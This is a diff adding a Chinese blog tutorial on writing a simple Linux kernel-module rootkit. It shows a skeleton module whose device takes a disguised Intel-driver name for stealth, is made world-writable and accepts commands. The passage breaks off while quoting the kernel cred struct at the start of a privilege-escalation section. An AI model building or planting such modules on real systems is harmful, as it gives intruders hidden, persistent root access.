@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="arttnba3">
+
+
+    <meta name="subtitle" content="arttnba3的秘密小屋">
+
+
+    <meta name="description" content="あがいた夢を捨てて揺れる今日は眠って誤魔化せ">
+
+
+
+<title>【CODE.0x01】简易 Linux Rootkit 编写入门指北 | arttnba3&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/img/favicon.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">「arttnba3」的隐秘小屋</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" target="_blank" rel="noopener" href="https://blog.arttnba3.cn">Blog</a>
+                
+                    <a class="menu-item" target="_blank" rel="noopener" href="https://github.com/arttnba3">Github</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">「arttnba3」的隐秘小屋</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" target="_blank" rel="noopener" href="https://blog.arttnba3.cn">Blog</a>
+                
+                    <a class="menu-item" target="_blank" rel="noopener" href="https://github.com/arttnba3">Github</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">【CODE.0x01】简易 Linux Rootkit 编写入门指北</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">arttnba3</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">七月 7, 2021&nbsp;&nbsp;8:53:52</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CODE/">CODE</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>「I’M A PENGUIN」</p>
+<span id="more"></span>
+
+<p>后门？👴直接重装系统给你扬了（</p>
+<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00.概述"></a>0x00.概述</h1><p>「Rootkit」即「root kit」，直译为中文便是「根权限工具包」的意思，在今天的语境下更多指的是一种被作为驱动程序、加载到操作系统内核中的恶意软件，这一类恶意软件的主要用途便是「驻留在计算机上提供 root 后门」——当攻击者再次拿到某个服务器的 shell 时可以通过 rootkit 快速提权到 root</p>
+<p>Linux 下的 rootkit 主要以「可装载内核模块」（LKM）的形式存在，作为内核的一部分<strong>直接以 ring0 权限向入侵者提供服务</strong>；当攻击者拿到某台计算机的 shell 并通过相应的漏洞提权到 root 之后便可以在计算机中留下 rootkit，以<strong>为攻击者后续入侵行为提供驻留的 root 后门</strong></p>
+<p>但是作为内核的一部分，<strong>LKM 编程在一定意义上便是内核编程，与内核版本密切相关，只有使用相应版本内核源码进行编译的 LKM 才可以装载到对应版本的 kernel 上</strong>，这使得 Linux rootkit 显得有些鸡肋（例如服务器管理员某天升级内核版本你就被扬了），且不似蠕虫病毒那般可以在服务期间肆意传播，但不可否认的是 LMK 仍是当前 Linux 下较为主流的 rootkit 技术之一</p>
+<p>本篇博客仅为最基础的 rootkit 编写入门指南，若是需要成熟可用的 rootkit 可以参见 <a target="_blank" rel="noopener" href="https://github.com/f0rb1dd3n/Reptile">f0rb1dd3n&#x2F;Reptile: LKM Linux rootkit (github.com)</a></p>
+<p>本篇引用的内核源码来自于 Linux 内核版本 <code>5.11</code></p>
+<blockquote>
+<p>Linux 下尝试装载不同版本的 LKM 会显示如下错误信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod: ERROR: could not insert module hellokernel.ko: Invalid module format</span><br></pre></td></tr></table></figure>
+
+
+</blockquote>
+<h1 id="0x01-最简单的-LKM"><a href="#0x01-最简单的-LKM" class="headerlink" title="0x01. 最简单的 LKM"></a>0x01. 最简单的 LKM</h1><blockquote>
+<p>这里不会叙述太多 Linux 内核编程相关的知识，主要以 rootkit 编写所会用到的一些技术为主</p>
+<p>基本的 LKM 编写入门见<a href="https://arttnba3.cn/2021/02/21/NOTE-0X02-LINUX-KERNEL-PWN-PART-I/#%E4%BA%94%E3%80%81%E7%BC%96%E5%86%99%E5%8F%AF%E8%A3%85%E8%BD%BD%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%EF%BC%88LKMs%EF%BC%89">这里</a></p>
+</blockquote>
+<p>以下给出了一个最基础的 LKM 模板，注册了一个字符型设备作为后续使用的接口</p>
+<blockquote>
+<p>rootkit.c</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* rootkit.ko</span></span><br><span class="line"><span class="comment">* developed by arttnba3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;functions.c&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">rootkit_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// register device</span></span><br><span class="line">    major_num = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;a3_rootkit_fo);     <span class="comment">// major number 0 for allocated by kernel</span></span><br><span class="line">    <span class="keyword">if</span>(major_num &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> major_num;   <span class="comment">// failed</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// create device class</span></span><br><span class="line">    module_class = class_create(THIS_MODULE, CLASS_NAME);</span><br><span class="line">    <span class="keyword">if</span>(IS_ERR(module_class))</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(module_class);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// create device inode</span></span><br><span class="line">    module_device = device_create(module_class, <span class="literal">NULL</span>, MKDEV(major_num, <span class="number">0</span>), <span class="literal">NULL</span>, DEVICE_NAME);</span><br><span class="line">    <span class="keyword">if</span>(IS_ERR(module_device))   <span class="comment">// failed</span></span><br><span class="line">    &#123;</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(module_device);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __file = filp_open(DEVICE_PATH, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(__file))			<span class="comment">// failed</span></span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(__file);</span><br><span class="line">    &#125;</span><br><span class="line">    __inode = file_inode(__file);</span><br><span class="line">    __inode-&gt;i_mode |= <span class="number">0666</span>;</span><br><span class="line">    filp_close(__file, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">rootkit_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">    class_destroy(module_class);</span><br><span class="line">    unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;arttnba3&quot;</span>);</span><br><span class="line">MODULE_INFO(intree, <span class="string">&quot;Y&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>functions.c</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;rootkit.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">a3_rootkit_open</span><span class="params">(<span class="keyword">struct</span> inode * __inode, <span class="keyword">struct</span> file * __file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">a3_rootkit_read</span><span class="params">(<span class="keyword">struct</span> file * __file, <span class="type">char</span> __user * user_buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> * __loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">a3_rootkit_write</span><span class="params">(<span class="keyword">struct</span> file * __file, <span class="type">const</span> <span class="type">char</span> __user * user_buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> * __loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *param;</span><br><span class="line"></span><br><span class="line">    param = kmalloc(size + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    copy_from_user(param, user_buf, size);</span><br><span class="line">    param[size] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (param[size - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>)    <span class="comment">// like echo &#x27;cmd param&#x27; &gt; /dev/rootkitdev, a &#x27;\n&#x27; will be appended at the end</span></span><br><span class="line">        param[size - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// analyze there</span></span><br><span class="line"></span><br><span class="line">    kfree(param);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">a3_rootkit_release</span><span class="params">(<span class="keyword">struct</span> inode * __inode, <span class="keyword">struct</span> file * __file)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;get info&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">a3_rootkit_ioctl</span><span class="params">(<span class="keyword">struct</span> file * __file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> param)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>rootkit.h</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// a difficult-to-detect name</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;intel_rapl_msrdv&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLASS_NAME <span class="string">&quot;intel_rapl_msrmd&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_PATH <span class="string">&quot;/dev/intel_rapl_msrdv&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> major_num;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> * <span class="title">module_class</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">device</span> * <span class="title">module_device</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * __<span class="title">file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> * __<span class="title">inode</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">rootkit_init</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">rootkit_exit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">a3_rootkit_open</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">a3_rootkit_read</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">a3_rootkit_write</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">a3_rootkit_release</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">a3_rootkit_ioctl</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">a3_rootkit_fo</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">	.owner = THIS_MODULE,</span><br><span class="line">    .unlocked_ioctl = a3_rootkit_ioctl,</span><br><span class="line">    .open = a3_rootkit_open,</span><br><span class="line">    .read = a3_rootkit_read,</span><br><span class="line">    .write = a3_rootkit_write,</span><br><span class="line">    .release = a3_rootkit_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>makefile</p>
+</blockquote>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Makefile2.6</span></span><br><span class="line">obj-m += rootkit.o</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">LINUX_KERNEL := <span class="variable">$(<span class="built_in">shell</span> uname -r)</span></span><br><span class="line">LINUX_KERNEL_PATH := /usr/src/linux-headers-<span class="variable">$(LINUX_KERNEL)</span></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C <span class="variable">$(LINUX_KERNEL_PATH)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></table></figure>
+
+<p>我们接下来将以该模块作为蓝本进行修改</p>
+<h1 id="0x02-进程权限提升"><a href="#0x02-进程权限提升" class="headerlink" title="0x02.进程权限提升"></a>0x02.进程权限提升</h1><h2 id="cred-结构体"><a href="#cred-结构体" class="headerlink" title="cred 结构体"></a>cred 结构体</h2><p>对于 Linux 下的每一个进程，在 kernel 中都有着一个结构体 <code>cred</code> 用以标识其权限，该结构体定义于内核源码<code>include/linux/cred.h</code>中，如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span 